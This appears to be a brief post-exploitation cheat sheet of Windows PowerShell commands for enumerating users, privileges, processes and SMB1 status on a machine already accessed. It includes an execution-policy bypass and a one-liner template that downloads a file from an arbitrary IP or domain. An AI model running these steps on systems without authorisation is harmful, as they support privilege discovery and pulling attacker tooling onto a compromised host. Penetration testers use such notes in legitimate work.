## first move to a powershell:-
powershell.exe

## then the obvious:-
whoami<br />
whoami /priv<br />
net user<br />
net localgroup Administrators<br />
Get-ExecutionPolicy<br />
powershell.exe -ep bypass (to set execution policy to bypass)<br />
$PSVersionTable.PSVersion.Major (to check the version of powershell)

## About the system and proccess running:-
systeminfo<br />
tasklist<br />
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) (to check if you r admin or not)<br />
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Lanmanserver\Parameters" -Name SMB1 -ErrorAction SilentlyContinue | Select-Object "SMB1") (to check for smb version 1)<br />


## To Download somthing from the internet or intranet:-
powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://'ip address/domain:port'/'file path from the root dir of server'","'download location's full path'\'programname.extension'")
**Everything in this command is without the single quote**
